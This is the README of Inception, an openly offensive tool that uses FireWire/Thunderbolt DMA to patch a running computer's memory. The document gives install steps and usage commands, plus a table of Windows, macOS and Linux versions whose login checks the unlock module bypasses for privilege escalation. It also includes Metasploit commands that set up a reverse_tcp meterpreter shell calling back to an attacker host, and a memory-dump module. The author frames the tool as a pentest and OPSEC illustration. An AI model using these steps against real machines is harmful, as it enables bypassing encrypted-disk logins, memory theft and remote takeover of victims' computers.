INCEPTION
=========

Inception is a physical memory manipulation and hacking tool exploiting 
PCI-based DMA. The tool can attack over FireWire, Thunderbolt, ExpressCard, PC
Card and any other PCI/PCIe HW interfaces.

Inception aims to provide a *relatively* quick, stable and easy way of performing
intrusive and non-intrusive memory hacks against live computers using DMA.

### How it works

Inception’s modules work as follows: By presenting a Serial Bus Protocol 2
(SBP-2) unit directory to the victim machine over a IEEE1394 FireWire
interface, the victim operating system thinks that a SBP-2 device has connected
to the FireWire port. Since SBP-2 devices utilize Direct Memory Access (DMA)
for fast, large bulk data transfers (e.g., FireWire hard drives and digital
camcorders), the victim lowers its shields and enables DMA for the device. The
tool now has full read/write access to the lower 4GB of RAM on the victim.

Once DMA is granted, the tool proceeds to search through available memory pages
for signatures at certain offsets in the operating system’s code. Once found,
the tool manipulates this code. For instance, in the unlock module, the tool
short circuits the operating system’s password authentication module that is
triggered if an incorrect password is entered.

*After running that module you should be able to log into the victim machine 
using any password.*

An analogy for this operation is planting an idea into the memory of the
machine; the idea that every password is correct. In other words, the 
equivalent of a [memory inception] [1].

Inception is free as in beer and a side project of mine. 


### Awesome! But why?

The world's forensics experts, governments and three-letter acronym agencies
are using [similar tools] [2] already. So if you are a dissident or facing 
an opressive regime, this tool illustrates why OPSEC is important. Never 
leave your laptop out of sight.


### Caveats

[OS X > 10.7.2] [6] and [Windows > 8.1] [7] disables FireWire DMA when the 
user has locked the OS and thus prevents inception. The tool will still work 
while a user is logged on. However, this is a less probable attack scenario IRL.

In addition, [OS X Mavericks > 10.8.2 on Ivy Bridge (>= 2012 Macs)] [8] have 
enabled VT-D, effectively blocking DMA requests and thwarting all inception 
modules even when the user is logged in. Look for `vtd[0] fault` entries in 
your log/console.

Even though these two caveats gradually will reduce the number of scenarios 
where this tool is useful, as of March 2015 [70 % of machines out there are 
still vulnerable] [9].


Key data
--------

 * Version: 0.4.2
 * License: GPL
 * Author:  Carsten Maartmann-Moe (carsten@carmaa.com)
 * Twitter: @MaartmannMoe
 * Source:  https://github.com/carmaa/inception

The tool makes use of the `libforensic1394` library courtesy of Freddie
Witherden under a LGPL license.


Requirements
------------

Inception requires:

 * Hardware:
   * Attacker machine: Linux or Mac OS X (host / attacker machine) with a
     FireWire interface, either through a native FireWire port, an 
     ExpressCard/PCMCIA expansion port or a Thunderbolt to FireWire adapter.
   * Victim machine: A FireWire or Thunderbolt interface, or an
     ExpressCard/PCMCIA expansion port

Linux is currently recommended on the attacker side due to buggy firewire 
interfaces on OS X. Note that direct ThunderBolt to ThunderBolt does *not*
work, you need a FireWire adapter. Your mileage may vary when attempting
to use Thunderbolt on Linux.

 * Software:
   * Python 3
   * git
   * gcc (incl. g++)
   * cmake
   * pip (for automatic resolution of dependencies)
   * [libforensic1394] [3]
   * msgpack


Installation
------------

On Debian-based distributions the installation commands can be summarized
as (apply `sudo` as needed if you're not root):

    apt-get install git cmake g++ python3 python3-pip

On OS X, you can install the tool requirements with [homebrew] [4]:

    brew install git cmake python3

After installing the requirements, download and install libforensic1394:

    wget https://freddie.witherden.org/tools/libforensic1394/releases/libforensic1394-0.2.tar.gz -O - | tar xz
    cd libforensic1394-0.2
    cmake CMakeLists.txt
    make install
    cd python
    python3 setup.py install

### Download and install Inception

    git clone git://github.com/carmaa/inception.git
    cd inception
    ./setup.py install

The setup script should be able to install dependencies if you have `pip`
installed.


General usage
-------------

 1. Connect the attacker machine (host) and the victim (target) with a FireWire
    cable
 2. Run Inception

Simply type:

    incept [module name]

For a more complete and up-to-date description, please run:

    incept -h

or see the [tool home page] [5].


Modules
-------

As of version 0.4.0, Inception has been modularized. The current modules, and
their functionality is described below.

For detailed options on usage, run:

    incept [module name] -h


### Unlock

The `unlock` module can unlock (any password accepted) and escalate privileges
to Administrator/root on almost* any powered on machine you have physical
access to. The module is primarily attended to do its magic against
computers that utilize full disk encryption such as BitLocker, FileVault,
TrueCrypt or Pointsec. There are plenty of other (and better) ways to hack a
machine that doesn't pack encryption. 

The unlock module is stable on machines that has 4 GiB of main memory or less.
If your the target has more then that, you need to be lucky in order to find
the signatures mapped to a physical memory page frame that the tool can reach.

As of this version, it is able to unlock the following x86 and x64 operating
systems:

|OS           |Version        |Unlock lock screen|Escalate privileges|
|:------------|:--------------|:----------------:|:-----------------:|
|Windows 8    |8.1            |       Yes (1)    |       Yes (1)     |
|Windows 8    |8.0            |        Yes       |        Yes        |
|Windows 7    |SP1            |        Yes       |        Yes        |
|Windows 7    |SP0            |        Yes       |        Yes        |
|Windows Vista|SP2            |        Yes       |        Yes        |
|Windows Vista|SP1            |        Yes       |        Yes        |
|Windows Vista|SP0            |        Yes       |        Yes        |
|Windows XP   |SP3            |        Yes       |        Yes        |
|Windows XP   |SP2            |        Yes       |        Yes        |
|Windows XP   |SP1            |                  |                   |
|Windows XP   |SP0            |                  |                   |
|Mac OS X     |Mavericks      |       Yes (1)    |       Yes (1)     |
|Mac OS X     |Mountain Lion  |       Yes (1)    |       Yes (1)     |
|Mac OS X     |Lion           |       Yes (1)    |       Yes (1)     |
|Mac OS X     |Snow Leopard   |        Yes       |        Yes        |
|Mac OS X     |Leopard        |                  |                   |
|Ubuntu       |Saucy          |        Yes       |        Yes        |
|Ubuntu       |Raring         |        Yes       |        Yes        |
|Ubuntu       |Quantal        |        Yes       |        Yes        |
|Ubuntu       |Precise        |        Yes       |        Yes        |
|Ubuntu       |Oneiric        |        Yes       |        Yes        |
|Ubuntu       |Natty          |        Yes       |        Yes        |
|Linux Mint   |13             |        Yes       |        Yes        |
|Linux Mint   |12             |        Yes       |        Yes        |
|Linux Mint   |12             |        Yes       |        Yes        |

(1): See caveats above.

Other Linux distributions that use PAM-based authentication may also work 
using the Ubuntu signatures.

The module also effectively enables escalation of privileges, for instance via
the `runas` or `sudo -s` commands, respectively.

#### Execution
    
To unlock, simply type:

    incept unlock

     _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
     _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
     _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
     _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
     _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|

    v.0.4.0 (C) Carsten Maartmann-Moe 2014
    Download: https://github.com/carmaa/inception | Twitter: @MaartmannMoe

    [?] Will potentially write to file. OK? [y/N] y
    [*] Available targets (known signatures):
    
    [1] Windows 8 MsvpPasswordValidate unlock/privilege escalation
    [2] Windows 7 MsvpPasswordValidate unlock/privilege escalation
    [3] Windows Vista MsvpPasswordValidate unlock/privilege escalation
    [4] Windows XP MsvpPasswordValidate unlock/privilege escalation
    [5] Mac OS X DirectoryService/OpenDirectory unlock/privilege escalation
    [6] Ubuntu libpam unlock/privilege escalation
    [7] Linux Mint libpam unlock/privilege escalation
    
    [?] Please select target (or enter 'q' to quit): 2
    [*] Selected target: Windows 7 MsvpPasswordValidate unlock/privilege escalation
    [=============>                                                ]  227 MiB ( 22%)
    [*] Signature found at 0xe373312 in page no. 58227
    [*] Patch verified; successful
    [*] BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!


### Implant

The `implant` module implants a (memory-only) Metasploit payload
directly to the volatile memory of the target machine. It integrates with MSF
through the `msfrpcd` daemon that is included in all versions of Metasploit.

The current version only work as a proof-of-concept against Windows 7 SP1 x86.
No other OSes, versions or architectures are supported, nor is there any
guarantee that they will be supported in the future.

#### Execution

To use it, start `msfrpcd`:

    msfrpcd -P [password]

Then launch inception in another terminal:

    incept implant --msfpw [password] --msfopts [options]

As an example, to create a reverse TCP meterpreter shell from the target
machine to your attacking host, first start the `msfrpcd` dameon, and then
launch a console listening for callbacks. 

    msfrpcd -P password
    msfconsole

In the console, we configure the receiving end of the payload. We're setting
the `EXITFUNC` option to `thread` to ensure that the target process stays alive
if something should go awry:

    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 172.16.1.1
    set EXITFUNC thread
    set ExitOnSession false
    exploit -j

Then, in another terminal, we launch Inception:

    incept implant --msfpw password --msfopts LHOST=172.16.1.1

     _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
     _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
     _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
     _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
     _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|

    v.0.4.0 (C) Carsten Maartmann-Moe 2014
    Download: https://github.com/carmaa/inception | Twitter: @MaartmannMoe

    [?] Will potentially write to file. OK? [y/N] y
    [!] This module currently only work as a proof-of-concept against Windows 7 SP1
        x86. No other OSes, versions or architectures are supported, nor is there
        any guarantee that they will be supported in the future.
    [?] What MSF payload do you want to use? windows/meterpreter/reverse_tcp
    [*] Selected options:
    [*] LPORT: 4444
    [*] LHOST: 172.16.1.1
    [*] EXITFUNC: thread
    [*] Stage 1: Searcing for injection point
    [================================>                             ]  537 MiB ( 53%)
    [*] Signature found at 0x219d118c in page no. 137681
    [*] Patching at 0x219d118c
    [\] Waiting to ensure stage 1 execution
    [*] Restoring memory at initial injection point
    [*] Stage 2: Searching for page allocated in stage 1
    [=========================>                                    ]  434 MiB ( 42%)
    [*] Signature found at 0x1b2d9000 in page no. 111321
    [*] Patching at 0x1b2d9000
    [*] Patch verified; successful
    [*] BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!

In your MSF console, you should see something similar to this:

    msf exploit(handler) > [*] Sending stage (769536 bytes) to 172.16.78.200
    [*] Meterpreter session 1 opened (172.16.1.1:4444 -> 172.16.78.200:49178) at 2014-08-30 16:23:31 +0200

    msf exploit(handler) > sessions

    Active sessions
    ===============

      Id  Type                   Information                            Connection
      --  ----                   -----------                            ----------
      1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ WIN-11FMQRBAMJ6  172.16.1.1:4444 -> 172.16.78.200:49178 (172.16.78.200)

    msf exploit(handler) > sessions -i 1
    [*] Starting interaction with 1...

    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM


### Dump

The `dump` module facilitates dumping of memory from the target to the
attacking host.

#### Execution

    incept dump

     _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
     _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
     _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
     _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
     _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|

    v.0.4.0 (C) Carsten Maartmann-Moe 2014
    Download: https://github.com/carmaa/inception | Twitter: @MaartmannMoe

    [*] Dumping from 0x0 to 0x40000000, a total of 1 GiB:
    [==============================================================] 1024 MiB (100%)
    [*] Dumped memory to file memdump_0x0-0x40000000_20140830-174305.bin
    [*] BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!


Known bugs / caveats
--------------------

Please see the comments at the top and the [tool home page] [5].
   

Troubleshooting
---------------

Please see the [tool home page] [5].


Planned features
----------------

 * Reliable implants on x64
 * VT-D bypass
 * Kernel (ring 0) implants
 * More signatures
 
 
Development history
-------------------
 
 * 0.0.1 - First version, supports basic Windows XP SP3, Vista and 7, Mac OS X
           and Ubuntu Gnome unlocking  
 * 0.0.2 - Added signatures for early XP SP3, and Windows 7 x86 and x64 SP1  
 * 0.0.3 - Added some signatures (thanks Tekkenhead) and error handling  
 * 0.0.4 - Added businfo to display connected FireWire devices as well as
           memory dumping capabilities  
 * 0.0.5 - Enhanced memory dumping abilities and added samples catalog  
 * 0.0.6 - Added unit testing  
 * 0.0.7 - Updated Ubuntu signatures and priv. escalation - thanks Adel Khaldi
           from Algeria  
 * 0.0.8 - Fixed Ubuntu unlock and privilege escalation patches - single patch
           for double the action
 * 0.1.0 - First minor version! Added signatures for OS X and Vista, plus quite
           a few bug fixes
 * 0.1.1 - Added signatures for Ubuntu 12.04 LTS
 * 0.1.2 - Patched several bugs
 * 0.1.3 - Patched OS X 10.6.8 x64 signature bug
 * 0.1.4 - Added manual mode easing testing of new signatures
 * 0.2.0 - Added signatures for OS X Mountain Lion (10.8) and Windows 8
 * 0.2.1 - Added signatures for Ubuntu 12.10
 * 0.2.2 - Added signatures for Linux Mint
 * 0.2.3 - General code cleanup, and nicer and more consistent output
 * 0.2.4 - Added a progress bar 
 * 0.2.5 - No longer needed to be root to run the tool
 * 0.2.6 - Bug fixes
 * 0.3.0 - Added support for Ubuntu 13.04 targets
 * 0.3.1 - Added support for OS X Maverics and Windows 8.1
 * 0.3.2 - Bug fixes and support for Ubuntu 13.10
 * 0.3.3 - Bug fixes regarding output and error handling
 * 0.3.4 - Maestro!
 * 0.3.5 - Added Ubuntu 10.10 and 10.04 x86 signatures
 * 0.4.0 - Complete restructuring and rewrite. Added implant module
 * 0.4.1 - Merged SLOTSCREAMER interface support
 * 0.4.2 - New signatures
 
 
Disclaimer
----------
Do no evil with this tool. Also, I am a pentester, not a developer. So if you
see weird code that bugs your pythonesque purity senses, drop me a note on how
I can improve it. Or even better, fork my code, change it and issue a pull
request.

[1]: http://inception.davepedu.com
[2]: https://wikileaks.org/spyfiles/files/0/293_GAMMA-201110-FinFireWire.pdf
[3]: http://freddie.witherden.org/tools/libforensic1394/
[4]: http://mxcl.github.io/homebrew/
[5]: http://www.breaknenter.org/projects/inception/
[6]: http://support.apple.com/en-us/HT202348
[7]: http://www.microsoft.com/en-us/download/details.aspx?id=41671
[8]: https://www.youtube.com/watch?v=0FoVmBOdbhg
[9]: http://www.w3schools.com/browsers/browsers_os.asp
